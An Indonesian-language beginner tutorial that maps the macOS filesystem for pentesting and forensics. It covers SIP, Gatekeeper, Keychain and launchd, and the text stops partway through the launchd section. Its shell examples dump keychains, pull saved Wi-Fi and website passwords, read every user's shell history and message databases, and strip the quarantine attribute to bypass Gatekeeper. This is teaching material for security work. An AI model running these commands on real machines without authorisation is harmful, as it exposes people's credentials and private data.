# Sistem Berkas macOS

> **Zero2Root** | Seri Dasar-Dasar | kodoktheGr3at | 2026

---

<!-- LC-CURRICULUM-START -->
> **ID Kurikulum:** `LC-007` | **Fase 0:** Fondasi
> **Estimasi belajar:** 4-5 jam | **Level:** Pemula
> **Prasyarat:** LC-001
> **Peta buku:** Ward, How Linux Works (perbandingan dengan Unix); panduan platform Apple
<!-- LC-CURRICULUM-END -->

## Daftar Isi

| # | Topik |
|---|-------|
| 1 | Overview: apa itu sistem berkas macOS |
| 2 | Pohon direktori lengkap |
| 3 | Direktori root |
| 4 | `/Applications`: aplikasi terinstal |
| 5 | `/System`: inti sistem operasi (dilindungi SIP) |
| 6 | `/Library` dan `~/Library`: data dukungan aplikasi dan sistem |
| 7 | `/Users`: direktori home pengguna |
| 8 | `/private/etc`: konfigurasi gaya Unix |
| 9 | `/private/var`: data variabel dan log |
| 10 | `/private/tmp`: file sementara |
| 11 | `/bin` dan `/sbin`: binary Unix esensial |
| 12 | `/usr`: resource Unix bersama |
| 13 | Bundle `.app`: struktur paket aplikasi |
| 14 | SIP dan Gatekeeper: proteksi sistem macOS |
| 15 | Keychain: penyimpanan kredensial |
| 16 | LaunchAgents dan LaunchDaemons: persistence dan startup |
| 17 | Volumes dan APFS: struktur volume modern |
| 18 | Catatan keamanan: lokasi sensitif dan hardening defensif |
| 19 | Contoh workflow rekon praktis |

---

## Istilah penting

Istilah-istilah ini akan sering muncul di materi.

| Istilah | Artinya |
|:---|:---|
| APFS | Apple File System: file system macOS modern (snapshot, enkripsi) |
| Volume | Wadah penyimpanan yang bisa di-mount; macOS menampilkannya di `/Volumes` |
| Path | Lokasi file; macOS bergaya Unix dengan garis miring (`/Users/alex`) |
| Bundle | Folder yang diperlakukan macOS sebagai satu item, seperti aplikasi `.app` |
| SIP | System Integrity Protection: mencegah bahkan root mengubah file sistem terlindungi |
| Gatekeeper | Pengecekan yang secara default hanya membolehkan app bertanda tangan/ter-notarize jalan |
| Quarantine | Tanda yang dipasang macOS pada file unduhan untuk memicu pengecekan itu |
| Home / Library | File-mu ada di `/Users/<nama>`; pengaturan app ada di `Library`-nya |

---

## 1. Overview: Apa Itu Sistem Berkas macOS

Sistem berkas macOS dibangun di atas fondasi Unix (BSD/Darwin), sehingga strukturnya mirip Linux: satu pohon direktori tunggal dari `/`. Namun macOS menambahkan lapisan khusus Apple di atasnya, seperti `/Applications`, `/Library`, dan format bundle `.app` yang tidak ada di Linux murni.

Sistem berkas modernnya adalah APFS (Apple File System), yang menggantikan HFS+ lama. APFS mendukung:

- Snapshot untuk pemulihan state filesystem secara instan
- Volume group, di mana banyak volume berbagi satu partisi fisik (Data dan System dipisah sejak macOS Catalina)
- Enkripsi native, dengan FileVault yang terintegrasi penuh
- Copy-on-write dan pembagian ruang

Sejak macOS Catalina (10.15), sistem menerapkan Read-Only System Volume: volume `/System` dipisah dari volume `Data`, dan dilindungi oleh SIP (System Integrity Protection).

Mengapa ini penting untuk pekerjaan keamanan:

- Mengetahui lokasi kredensial (Keychain, data browser) adalah target rekognisi.
- Memahami SIP dan sandboxing memberitahumu batas-batas privilege escalation.
- Mengetahui lokasi unified log penting untuk forensik dan incident response.
- Memahami LaunchAgents dan LaunchDaemons penting untuk persistence dan analisis malware.
- Mengetahui struktur bundle `.app` penting untuk analisis malware macOS.

---

## 2. Pohon Berkas: Struktur Direktori Lengkap

```
/                                      ← Root of the entire file system (Data volume, writable)
│
├── Applications/                      ← User-installed & built-in apps (.app bundles)
│   ├── Safari.app/
│   ├── Utilities/                     ← Built-in utility apps
│   │   ├── Terminal.app/
│   │   ├── Activity Monitor.app/
│   │   ├── Console.app/
│   │   ├── Keychain Access.app/
│   │   └── Disk Utility.app/
│   └── ThirdPartyApp.app/
│
├── System/                            ← Read-only, SIP-protected (sealed system volume)
│   ├── Applications/                  ← Apple's built-in apps (Catalina+)
│   ├── Library/                       ← System-level frameworks, daemons, extensions
│   │   ├── LaunchDaemons/             ← System-wide background services (persistence!)
│   │   ├── LaunchAgents/              ← System-wide per-user agents
│   │   ├── Extensions/                ← Kernel extensions (kext) — legacy
│   │   ├── Frameworks/                ← System frameworks
│   │   ├── CoreServices/              ← Finder, SystemUIServer, etc.
│   │   ├── PrivateFrameworks/
│   │   └── Keychains/                 ← System root certificates
│   └── Volumes/
│       └── Data/                      ← Symlinked to writable data volume (Catalina+)
│
├── Library/                           ← System-wide application support (not user-specific)
│   ├── Application Support/
│   ├── LaunchAgents/                  ← Third-party agents (login items, persistence!)
│   ├── LaunchDaemons/                 ← Third-party daemons (persistence!)
│   ├── Logs/                          ← System & app logs
│   │   ├── DiagnosticReports/         ← Crash reports (forensics!)
│   │   └── CrashReporter/
│   ├── Preferences/                   ← System-wide plist preference files
│   ├── Caches/
│   ├── Extensions/                    ← Legacy kernel extensions
│   ├── StartupItems/                  ← Legacy startup items (pre-launchd)
│   ├── Keychains/                     ← System keychain
│   ├── WebServer/                     ← Legacy Apache web root (older macOS)
│   └── Printers/
│
├── Users/                             ← All user home directories
│   ├── Shared/                        ← Shared between all users
│   │
│   ├── alice/                         ← Regular user's home directory
│   │   ├── Desktop/
│   │   ├── Documents/
│   │   ├── Downloads/
│   │   ├── Movies/
│   │   ├── Music/
│   │   ├── Pictures/
│   │   ├── Public/                    ← Drop Box for file sharing
│   │   ├── .bash_history              ← Command history! (hidden)
│   │   ├── .zsh_history               ← Zsh history (default shell since Catalina)
│   │   ├── .ssh/                      ← SSH keys (hidden)
│   │   │   ├── id_rsa                 ← Private key
│   │   │   ├── id_ed25519
│   │   │   └── known_hosts
│   │   └── Library/                   ← PER-USER app data (hidden by default!)
│   │       ├── Application Support/   ← App data, configs, sometimes credentials
│   │       │   ├── Slack/
│   │       │   ├── 1Password/
│   │       │   └── Google/Chrome/
│   │       ├── Preferences/           ← .plist files — app & system settings
│   │       │   └── com.apple.finder.plist
│   │       ├── Caches/                ← App caches
│   │       ├── Cookies/               ← Browser cookies (legacy location)
│   │       ├── Keychains/             ← User's login.keychain-db!
│   │       │   └── login.keychain-db  ← Saved passwords, certs, keys!
│   │       ├── LaunchAgents/          ← Per-user persistence!
│   │       ├── Mail/                  ← Local Mail.app data
│   │       ├── Messages/              ← iMessage database (chat.db)
│   │       ├── Safari/                ← Safari history, bookmarks
│   │       │   └── History.db
│   │       ├── Logs/                  ← Per-app logs
│   │       ├── CloudStorage/          ← iCloud Drive, Dropbox, etc.
│   │       └── Containers/            ← Sandboxed app data (per bundle ID)
│   │
│   └── bob/
│       └── (same structure as above)
│
├── private/                           ← Actual location of /etc, /tmp, /var (symlinked from root)
│   ├── etc/                           ← Unix-style system config (symlink target of /etc)
│   │   ├── passwd                     ← Legacy user list (NOT primary source — see dscl)
│   │   ├── hosts                      ← Static hostname resolution
│   │   ├── ssh/
│   │   │   └── sshd_config
│   │   ├── sudoers                    ← Sudo permissions
│   │   ├── pf.conf                    ← Packet filter firewall config
│   │   └── crontab                    ← Legacy cron (launchd preferred now)
│   ├── var/                           ← Variable data (symlink target of /var)
│   │   ├── log/
│   │   │   ├── system.log             ← Legacy system log (pre-unified logging)
│   │   │   ├── install.log            ← Installation events
│   │   │   ├── wifi.log
│   │   │   └── DiagnosticMessages/
│   │   ├── db/
│   │   │   └── dslocal/               ← Local user account database (Open Directory)
│   │   │       └── nodes/Default/users/
│   │   ├── folders/                   ← Per-user temp & cache (randomized paths!)
│   │   ├── root/                      ← root user's home (rarely used directly)
│   │   └── audit/                     ← BSM security audit logs
│   └── tmp/                           ← Temporary files (symlink target of /tmp)
│
├── bin/                                ← Essential Unix binaries (bash, ls, cp, cat...)
├── sbin/                               ← Essential system admin binaries
│
├── usr/                                 ← Unix shared resources
│   ├── bin/                             ← Most command-line tools
│   ├── sbin/
│   ├── lib/
│   ├── local/                           ← Homebrew (Intel) typically lives here
│   │   └── bin/
│   └── share/
│
├── opt/                                  ← Homebrew (Apple Silicon) typically lives here
│   └── homebrew/
│       └── bin/
│
├── etc -> private/etc                    ← Symlink
├── tmp -> private/tmp                    ← Symlink
├── var -> private/var                    ← Symlink
│
├── Volumes/                              ← Mounted external/network volumes
│   ├── Macintosh HD/                     ← Self-reference to boot volume
│   └── USB_DRIVE/
│
├── .Spotlight-V100/                      ← Spotlight search index (hidden)
├── .fseventsd/                           ← Filesystem event logs (forensics!)
├── .Trashes/                             ← Trash for non-boot volumes
├── .DS_Store                             ← Per-folder Finder metadata (forensics!)
│
└── cores/                                ← Core dump files (crash forensics)
```

---

## 3. `/` — Direktori Root (Tampilan Firmlink Sintetis)

Sejak macOS Catalina, `/` yang kamu lihat sebenarnya adalah tampilan gabungan (firmlink) dari dua volume terpisah: volume System (read-only, disegel secara kriptografis) dan volume Data (writable). Apple menggunakan firmlink, bukan symlink biasa, untuk membuat keduanya tampak sebagai satu pohon direktori, transparan bagi pengguna.

```bash
# Navigate to root
$ cd /
$ ls -la /

# Check the volume structure
$ diskutil list
/dev/disk3 (synthesized):
   #:                       TYPE NAME                    SIZE       IDENTIFIER
   0:      APFS Container Scheme -                       +494.4 GB  disk3
                                 Physical Store disk0s2
   1:                APFS Volume Macintosh HD - Data      300.1 GB   disk3s1
   2:                APFS Volume Macintosh HD             15.3 GB    disk3s5  (System, sealed)
   3:                APFS Volume Preboot                  500.0 MB   disk3s2
   4:                APFS Volume Recovery                 1.1 GB     disk3s3
   5:                APFS Volume VM                       1.1 GB     disk3s6

# View firmlinks mapping
$ cat /usr/share/firmlinks
/AppleInternal	AppleInternal
/Applications	Applications
/Library	Library
/System/Library/Caches	System/Library/Caches
/Users	Users
/Volumes	Volumes
...

# Check if SIP is enabled
$ csrutil status
System Integrity Protection status: enabled.
```

---

## 4. `/Applications` — Aplikasi Terinstal

`/Applications` adalah lokasi standar untuk aplikasi yang terinstal di macOS, baik bawaan Apple maupun pihak ketiga. Setiap aplikasi adalah bundle `.app`: sebenarnya folder berisi executable, resource, dan metadata, tapi ditampilkan Finder sebagai satu file.

```bash
# List installed applications
$ ls /Applications

# List applications with details
$ ls -la /Applications/*.app

# Find all .app bundles system-wide
$ find / -name "*.app" -maxdepth 4 2>/dev/null

# Check app's bundle identifier
$ defaults read /Applications/Safari.app/Contents/Info.plist CFBundleIdentifier
com.apple.Safari

# Check code signature (important for security analysis)
$ codesign -dv --verbose=4 /Applications/Safari.app

# List running applications
$ osascript -e 'tell application "System Events" to get name of every process'

# System-wide installed application inventory (via system_profiler)
$ system_profiler SPApplicationsDataType
```

| Path | Isi | Nilai pentest |
|------|-----|-----------------|
| `/Applications/*.app` | Aplikasi level-user | Sedang |
| `/System/Applications/*.app` | Aplikasi bawaan Apple | Rendah |
| `*.app/Contents/MacOS/` | Binary executable | Tinggi |
| `*.app/Contents/Info.plist` | Metadata aplikasi | Sedang |
| `*.app/Contents/Resources/` | Asset dan resource | Rendah |

---

## 5. `/System` — Inti Sistem Operasi (Dilindungi SIP)

`/System` adalah jantung sistem operasi macOS, berisi semua framework, daemon, dan komponen inti Apple. Sejak macOS Big Sur, volume ini bersifat read-only dan disegel secara kriptografis. Bahkan root tidak bisa menulis di sini tanpa menonaktifkan SIP terlebih dahulu.

`/System/Library` berbeda dari `/Library` (level-sistem tapi tidak dilindungi SIP) dan `~/Library` (per-user). Jangan tertukar.

```bash
# Attempt to write to /System (will fail with SIP enabled)
$ sudo touch /System/test.txt
touch: /System/test.txt: Read-only file system

# View SIP-protected paths
$ csrutil status
System Integrity Protection status: enabled.

# List system LaunchDaemons (persistence-relevant, but SIP-protected)
$ ls /System/Library/LaunchDaemons/ | head -10

# View kernel extensions (legacy, mostly replaced by System Extensions)
$ ls /System/Library/Extensions/ | head -10
$ kextstat                       # list loaded kernel extensions (deprecated cmd)
$ kmutil showloaded              # modern equivalent

# Check System Extensions (modern replacement for kexts)
$ systemextensionsctl list

# View CoreServices (Finder, Dock, etc.)
$ ls /System/Library/CoreServices/
```

| Subdirektori | Isi |
|--------------|-----|
| `/System/Library/LaunchDaemons` | Layanan sistem Apple |
| `/System/Library/Frameworks` | Framework inti macOS |
| `/System/Library/CoreServices` | Finder, SystemUIServer |
| `/System/Library/Extensions` | Kernel extension (legacy) |
| `/System/Library/Keychains` | Sertifikat root sistem |

---

## 6. `/Library` dan `~/Library` — Data Dukungan Aplikasi

Ada dua lokasi Library dengan tujuan berbeda:

- `/Library`: data dan preferensi level-sistem yang berlaku untuk semua user. Ini tidak dilindungi SIP, jadi root bisa menulis di sini.
- `~/Library`: data dan preferensi level-user, tersembunyi dari Finder secara default sejak macOS 10.7.

`~/Library` adalah harta karun forensik. Berisi keychain, cache browser, database pesan, dan preferensi aplikasi setiap user.

```bash
# Show hidden ~/Library in Finder (one-time)
$ chflags nohidden ~/Library

# Or navigate directly via Terminal (always accessible)
$ cd ~/Library
$ ls -la

# ── HIGH-VALUE FORENSIC LOCATIONS ────────────────────────────────

# Preferences (plist files — app & system settings)
$ ls ~/Library/Preferences/
$ defaults read com.apple.finder

# Saved passwords & certificates (requires unlock / Touch ID)
$ ls ~/Library/Keychains/
$ security list-keychains
$ security find-generic-password -ga "AccountName"   # prompts for keychain password

# Browser data (Safari)
$ sqlite3 ~/Library/Safari/History.db "SELECT url FROM history_items LIMIT 10;"

# Chrome data
$ ls ~/Library/Application\ Support/Google/Chrome/Default/

# iMessage database (forensics gold)
$ sqlite3 ~/Library/Messages/chat.db "SELECT text FROM message LIMIT 10;"

# Application crash logs
$ ls ~/Library/Logs/DiagnosticReports/

# LaunchAgents — persistence!
$ ls ~/Library/LaunchAgents/

# Login items (apps that start at login)
$ osascript -e 'tell application "System Events" to get the name of every login item'

# Quarantine database (downloaded file history — Gatekeeper)
$ sqlite3 ~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2 \
    "SELECT LSQuarantineDataURLString FROM LSQuarantineEvent LIMIT 10;"
```

### File Bernilai Tinggi di `~/Library/`

| Path | Isi | Nilai pentest |
|------|-----|-----------------|
| `Keychains/login.keychain-db` | Password dan sertifikat tersimpan | Kritis |
| `Application Support/` | Data dan config aplikasi | Tinggi |
| `Safari/History.db` | Riwayat browsing | Tinggi |
| `Messages/chat.db` | Database iMessage | Tinggi |
| `Preferences/*.plist` | Pengaturan aplikasi/sistem | Sedang |
| `LaunchAgents/` | Persistence per-user | Tinggi |
| `Logs/DiagnosticReports/` | Crash report | Sedang |
| `Containers/` | Data aplikasi sandboxed | Tinggi |
| `CloudStorage/` | iCloud Drive, Dropbox, dll | Sedang |

---

## 7. `/Users` — Direktori Home Pengguna

`/Users` berisi direktori home untuk setiap user di sistem, setara dengan `/home` di Linux. macOS menggunakan Zsh sebagai shell default sejak Catalina (sebelumnya Bash). Setiap user memiliki folder standar (Desktop, Documents, dll.) plus `~/Library` yang tersembunyi.

```bash
# List all user home directories
$ ls /Users
$ dscl . list /Users                     # list all user accounts (incl. system accounts)
$ dscl . list /Users | grep -v "^_"       # filter out system/service accounts

# Navigate to a user's home
$ cd /Users/alice
$ ls -la

# Shell history (gold mine!)
$ cat ~/.zsh_history                      # Zsh (default since Catalina)
$ cat ~/.bash_history                     # Bash (if used)

# Recently opened files / Quick Look cache
$ sqlite3 ~/Library/Application\ Support/com.apple.sharedfilelist/*.sfl2

# SSH keys
$ ls -la ~/.ssh/
$ cat ~/.ssh/id_rsa.pub

# Get info about all local user accounts
$ dscl . -list /Users UniqueID
$ dscl . -read /Users/alice

# Check admin group membership
$ dscl . -read /Groups/admin GroupMembership

# Foreach user, check shell history
$ for user in $(ls /Users); do
    echo "=== $user ==="
    sudo cat "/Users/$user/.zsh_history" 2>/dev/null
done
```

### File Bernilai Tinggi di `/Users/<username>/`

| Path | Isi | Nilai pentest |
|------|-----|-----------------|
| `.zsh_history` | Riwayat perintah Zsh | Kritis |
| `.bash_history` | Riwayat perintah Bash | Kritis |
| `.ssh/id_rsa` / `id_ed25519` | SSH private key | Tinggi |
| `Library/Keychains/` | Kredensial tersimpan | Kritis |
| `Desktop/` & `Documents/` | File pengguna | Sedang |
| `Public/` | Folder berbagi (Drop Box) | Sedang |

---

## 8. `/private/etc` — Konfigurasi Gaya Unix

`/etc` di macOS sebenarnya adalah symlink ke `/private/etc`. Berisi file konfigurasi gaya Unix klasik. Yang penting: macOS tidak menggunakan `/etc/passwd` sebagai sumber utama daftar user. Itu digantikan oleh Open Directory / dscl (Directory Service), meskipun `/etc/passwd` masih ada untuk kompatibilitas.

```bash
# Confirm /etc is a symlink
$ ls -la / | grep etc
lrwxr-xr-x  1 root  wheel  11 etc -> private/etc

# Static hostname resolution
$ cat /etc/hosts

# SSH daemon configuration
$ cat /etc/ssh/sshd_config

# Sudoers
$ sudo cat /etc/sudoers

# Packet filter firewall config
$ cat /etc/pf.conf
$ sudo pfctl -s rules              # show active firewall rules

# PRIMARY user database is Open Directory, NOT /etc/passwd:
$ dscl . list /Users
$ dscl . read /Users/alice UniqueID
$ dscl . read /Users/alice UserShell

# /etc/passwd is mostly a compatibility stub on modern macOS
$ cat /etc/passwd
##
# User Database
# Note that this file is consulted directly only when the system is running
# in single-user mode...
##
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
daemon:*:1:1:System Services:/var/root:/usr/bin/false
```

| File | Isi | Nilai pentest |
|------|-----|-----------------|
| `/etc/hosts` | Resolusi hostname statis | Sedang |
| `/etc/ssh/sshd_config` | Konfigurasi SSH daemon | Tinggi |
| `/etc/sudoers` | Izin sudo | Kritis |
| `/etc/pf.conf` | Konfigurasi firewall | Tinggi |
| `/etc/passwd` | Stub kompatibilitas (bukan sumber utama) | Rendah |

---

## 9. `/private/var` — Data Variabel dan Log

`/var` (symlink ke `/private/var`) berisi data yang sering berubah. Sejak macOS Sierra, sebagian besar logging pindah ke Unified Logging System (diakses lewat perintah `log`), bukan lagi file teks flat seperti `syslog` klasik. Tapi beberapa log legacy masih ada di sini.

```bash
# ── UNIFIED LOGGING SYSTEM (modern, primary method) ───────────────
$ log show --last 1h                            # show logs from last hour
$ log show --predicate 'eventMessage contains "ssh"' --last 1h
$ log stream                                      # live stream of system logs
$ log stream --predicate 'process == "sshd"'      # filter by process
$ log show --predicate 'subsystem == "com.apple.securityd"' --last 1d

# Authentication-related logs
$ log show --predicate 'eventMessage contains "authentication"' --last 1h

# ── LEGACY LOG FILES (still present) ───────────────────────────────
$ cat /var/log/system.log              # legacy system log (pre-Sierra style)
$ cat /var/log/install.log             # installation events
$ cat /var/log/wifi.log                # Wi-Fi connection events

# ── LOCAL USER DATABASE (Open Directory backend) ───────────────────
$ ls /var/db/dslocal/nodes/Default/users/
$ sudo plutil -p /var/db/dslocal/nodes/Default/users/alice.plist

# ── PER-USER TEMP/CACHE (randomized path!) ──────────────────────────
$ echo $TMPDIR
/var/folders/zz/zyxvpxvq6csfxvn_n0000000000/T/

# ── SECURITY AUDIT LOGS (BSM format) ────────────────────────────────
$ sudo praudit -l /var/audit/[timestamp]
```

### Subdirektori Penting di `/var`

| Direktori | Isi |
|-----------|-----|
| `/var/log` | Log legacy dan instalasi |
| `/var/db/dslocal` | Database user lokal |
| `/var/folders` | Temp/cache per-user (acak) |
| `/var/audit` | Log audit keamanan (BSM) |
| `/var/root` | Home root (jarang dipakai) |

---

## 10. `/private/tmp` — File Sementara

`/tmp` (symlink ke `/private/tmp`) adalah lokasi temp world-writable klasik, tapi macOS lebih sering menggunakan `$TMPDIR` per-user yang diacak (di `/var/folders/...`) untuk aplikasi modern. Kedua lokasi penting diperiksa saat post-exploitation.

```bash
# Classic /tmp
$ ls -la /tmp/
drwxrwxrwt  root wheel  tmp     ← "t" = sticky bit

# Modern randomized per-user temp directory
$ echo $TMPDIR
/var/folders/zz/zyxvpxvq6csfxvn_n0000000000/T/
$ ls -la "$TMPDIR"

# Find ALL per-user temp dirs (useful in multi-user forensics)
$ ls -la /var/folders/

# Common attacker artifacts to check:
$ ls -la /tmp/ "$TMPDIR" 2>/dev/null
# - Dropped payloads, downloaded scripts
# - Compiled exploit binaries
# - Persistence staging plists before being moved to LaunchAgents
```

Catatan pentest: karena `$TMPDIR` diacak per user dan berubah tiap sesi, banyak tool keamanan dan analis luput memeriksanya. Selalu cek `echo $TMPDIR` saat berada di sesi shell seorang user.

---

## 11. `/bin` dan `/sbin` — Binary Unix Esensial

Sama seperti Linux, `/bin` dan `/sbin` berisi binary Unix paling esensial. Namun sejak macOS Catalina+, lokasi ini berada di volume System yang read-only, dan beberapa tool BSD klasik (seperti `netstat`, `ifconfig`) makin sering digantikan oleh tool modern Apple (`lsof -i`, `networksetup`, `scutil`).

```bash
$ ls /bin
bash    cat    chmod   cp     csh    date
echo    kill   ln      ls     mkdir  mv
ps      pwd    rm      sh     zsh    ...

$ ls /sbin
fsck    ifconfig   mount    ping    reboot
route   shutdown   ...

# macOS-specific networking tools (preferred over legacy ones)
$ networksetup -listallhardwareports
$ scutil --dns                       # DNS configuration
$ scutil --nwi                       # network interface info
$ lsof -i -P                         # listening ports & connections (netstat replacement)
$ system_profiler SPNetworkDataType  # full network hardware report
```

| Binary | Fungsi |
|--------|--------|
| `dscl` | Kelola Directory Service |
| `scutil` | Konfigurasi sistem dan jaringan |
| `csrutil` | Kontrol SIP |
| `codesign` | Verifikasi tanda tangan kode |
| `spctl` | Kontrol Gatekeeper |
| `security` | Akses Keychain |

---

## 12. `/usr` — Resource Unix Bersama

`/usr` berisi mayoritas tool command-line Unix tambahan. Catatan penting: `/usr/bin` dan `/usr/sbin` sekarang read-only (dilindungi SIP) di macOS modern. Kamu tidak bisa lagi menambah binary langsung ke `/usr/bin` seperti dulu. Untuk itu, gunakan Homebrew, yang menginstal ke `/usr/local` (Intel Mac) atau `/opt/homebrew` (Apple Silicon).

```bash
$ ls /usr
bin  lib  libexec  local  sbin  share  std

# /usr/bin is SIP-protected
$ touch /usr/bin/test
touch: /usr/bin/test: Operation not permitted

# Homebrew locations (package manager — not pre-installed!)
$ which brew
/opt/homebrew/bin/brew              # Apple Silicon (M1/M2/M3/M4)
/usr/local/bin/brew                 # Intel Mac

$ brew list                          # installed packages
$ brew install nmap                  # install a tool

# Check architecture
$ uname -m
arm64        # Apple Silicon
x86_64       # Intel
```

| Direktori | Catatan |
|-----------|---------|
| `/usr/bin` | Dilindungi SIP, read-only |
| `/usr/local` | Homebrew (Intel) |
| `/opt/homebrew` | Homebrew (Apple Silicon) |

---

## 13. Bundle `.app` — Struktur Paket Aplikasi

Setiap aplikasi macOS sebenarnya adalah folder dengan ekstensi `.app`, terlihat seperti satu file di Finder tapi berisi struktur internal lengkap. Memahami struktur ini penting untuk analisis malware macOS dan reverse engineering.

```
SomeApp.app/
└── Contents/
    ├── Info.plist              ← App metadata (bundle ID, version, permissions)
    ├── MacOS/
    │   └── SomeApp              ← The actual executable binary
    ├── Resources/                ← Icons, images, localized strings
    │   └── AppIcon.icns
    ├── Frameworks/                ← Bundled frameworks/libraries
    ├── PlugIns/                    ← App extensions/plugins
    ├── _CodeSignature/              ← Code signing data
    │   └── CodeResources
    └── embedded.provisionprofile   ← Provisioning profile (if signed)
```

```bash
# Inspect an app bundle's contents
$ ls -la /Applications/Safari.app/Contents/

# View Info.plist (metadata: bundle ID, version, permissions requested)
$ plutil -p /Applications/Safari.app/Contents/Info.plist
$ defaults read /Applications/Safari.app/Contents/Info.plist

# Find the actual executable
$ file /Applications/Safari.app/Contents/MacOS/Safari

# Check code signature & entitlements (security analysis)
$ codesign -dv --verbose=4 /Applications/Safari.app
$ codesign -d --entitlements - /Applications/Safari.app

# Verify Gatekeeper assessment
$ spctl -a -vvv /Applications/Safari.app

# Check for unsigned / ad-hoc signed apps (suspicious!)
$ find /Applications -maxdepth 1 -name "*.app" -exec sh -c \
    'codesign -dv "{}" 2>&1 | grep -q "not signed" && echo "{}"' \;

# Extract & analyze a binary inside a bundle
$ otool -L /Applications/Safari.app/Contents/MacOS/Safari    # linked libraries
$ otool -h /Applications/Safari.app/Contents/MacOS/Safari    # mach-o header

# Check architecture (universal binary support)
$ lipo -info /Applications/Safari.app/Contents/MacOS/Safari
```

| Path di dalam `.app` | Isi | Nilai pentest |
|-----------------------|-----|-----------------|
| `Contents/MacOS/` | Binary eksekusi utama | Kritis |
| `Contents/Info.plist` | Metadata dan izin | Tinggi |
| `Contents/_CodeSignature/` | Data tanda tangan kode | Tinggi |
| `Contents/Resources/` | Asset (ikon, gambar) | Rendah |
| `Contents/Frameworks/` | Library tertanam | Sedang |

---

## 14. SIP dan Gatekeeper — Proteksi Sistem macOS

macOS punya beberapa lapisan proteksi unik yang tidak ada di Linux/Windows klasik, dan sangat memengaruhi cara pentest dilakukan:

- SIP (System Integrity Protection): mencegah modifikasi `/System`, `/bin`, `/sbin`, `/usr` bahkan oleh root.
- Gatekeeper: memverifikasi tanda tangan dan notarization sebelum aplikasi pertama kali dijalankan.
- TCC (Transparency, Consent, and Control): meminta izin user untuk akses kamera, mikrofon, file pribadi, dan sebagainya.
- Notarization: Apple memindai malware pada aplikasi sebelum mengizinkan distribusi di luar App Store.

```bash
# ── SIP ────────────────────────────────────────────────────────────
$ csrutil status
System Integrity Protection status: enabled.

# Disabling SIP requires Recovery Mode (not possible from normal boot):
# 1. Reboot, hold Cmd+R to enter Recovery
# 2. Open Terminal from Utilities menu
# 3. csrutil disable
# 4. Reboot

# ── GATEKEEPER ─────────────────────────────────────────────────────
$ spctl --status
assessments enabled

$ spctl -a -vvv /Applications/SomeApp.app    # check if app would be allowed to run

# Remove quarantine attribute (common bypass technique — known to attackers!)
$ xattr -d com.apple.quarantine /path/to/file.app
$ xattr -l /path/to/file.app                  # list all extended attributes

# ── TCC (PRIVACY PERMISSIONS) ────────────────────────────────────────
# TCC database (per-user) — tracks which apps have which permissions
$ sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
    "SELECT client,auth_value,service FROM access;"

# System-wide TCC database (requires Full Disk Access to read)
$ sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
    "SELECT client,auth_value,service FROM access;"

# Reset TCC permissions for an app
$ tccutil reset All com.somecompany.someapp

# ── NOTARIZATION CHECK ─────────────────────────────────────────────
$ spctl -a -t exec -vv /Applications/SomeApp.app
$ codesign --test-requirement="=notarized" --verify --verbose /Applications/SomeApp.app

# ── FULL DISK ACCESS (relevant for security tools & malware) ───────
# Check which apps have Full Disk Access (System Settings > Privacy)
# Programmatically:
$ sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
    "SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles';"
```

### Ringkasan Lapisan Proteksi macOS

| Proteksi | Fungsi | Relevansi bypass |
|----------|--------|---------------------|
| SIP | Melindungi file sistem inti | Butuh Recovery Mode |
| Gatekeeper | Verifikasi tanda tangan aplikasi | Penghapusan quarantine via `xattr -d` |
| TCC | Izin privasi (kamera, file) | Social engineering / penyalahgunaan TCC.db |
| Notarization | Pemindaian malware Apple | Penghindaran lewat ad-hoc signing |

---

## 15. Keychain — Penyimpanan Kredensial

Keychain adalah sistem penyimpanan kredensial terenkripsi bawaan macOS: menyimpan password Wi-Fi, password aplikasi, sertifikat, dan private key. Ini setara dengan Credential Manager di Windows, dan menjadi target nomor satu dalam post-exploitation macOS.

```bash
# List all keychains
$ security list-keychains

# Default keychain location
$ ls -la ~/Library/Keychains/
login.keychain-db

# Dump keychain info (won't show passwords without unlock)
$ security dump-keychain ~/Library/Keychains/login.keychain-db

# Find a specific password (prompts for keychain unlock / Touch ID)
$ security find-generic-password -s "ServiceName" -g

# Find Wi-Fi password (common pentest demo)
$ security find-generic-password -D "AirPort network password" -a "WiFiName" -w

# Find internet passwords (websites)
$ security find-internet-password -s "github.com" -g

# Export all certificates
$ security find-certificate -a -p ~/Library/Keychains/login.keychain-db

# Unlock keychain (requires password)
$ security unlock-keychain ~/Library/Keychains/login.keychain-db

# Keychain access via GUI (for comparison)
$ open -a "Keychain Access"

# System keychain (used by system services, root-readable)
$ ls -la /Library/Keychains/
$ sudo security dump-keychain /Library/Keychains/System.keychain
```

Catatan pentest: Keychain dilindungi oleh password login user (atau Touch ID). Tanpa password itu, dump keychain hanya menunjukkan metadata, bukan secret sebenarnya. Teknik seperti keychain dumping via memory (tooling gaya Mimikatz untuk macOS, misalnya `Chainbreaker`) diperlukan kalau kamu hanya punya akses non-interaktif.

| Keychain | Lokasi | Isi |
|----------|--------|-----|
| Login Keychain | `~/Library/Keychains/login.keychain-db` | Password user, Wi-Fi, kredensial aplikasi |
| System Keychain | `/Library/Keychains/System.keychain` | Kredensial level-sistem |
| iCloud Keychain | Sinkron via iCloud | Password tersinkron iCloud |

---

## 16. LaunchAgents dan LaunchDaemons — Persistence dan Startup

macOS tidak menggunakan cron sebagai mekanisme utama untuk tugas terjadwal atau startup modern. Itu digantikan oleh launchd, dikonfigurasi lewat file `.plist` di beberapa lokasi. Ini adalah vektor persistence nomor satu di macOS, baik untuk software legit maupun malware.

Perbedaan kunci:

- LaunchAgents berjalan sebagai user yang login dan punya akses GUI.
- LaunchDaemons berjalan sebagai root, tanpa sesi user, sebagai background service.

```bash
# ── FOUR PERSISTENCE LOCATIONS (in order of privilege) ──────────────
~/Library/LaunchAgents/                  # per-user, no admin needed
/Library/LaunchAgents/                   # all-users, needs admin to write
/Library/LaunchDaemons/                  # root-level daemon, needs admin
/System/Library/LaunchDaemons/           # Apple's own (SIP-protected)

# List all LaunchAgents/Daemons across the system
$ ls ~/Library/LaunchAgents/
$ ls /Library/LaunchAgents/
$ ls /Library/LaunchDaemons/

# View a launchd plist
$ cat ~/Library/LaunchAgents/com.example.agent.plist
$ plutil -p ~/Library/LaunchAgents/com.example.agent.plist

# List all currently loaded launchd jobs
$ launchctl list
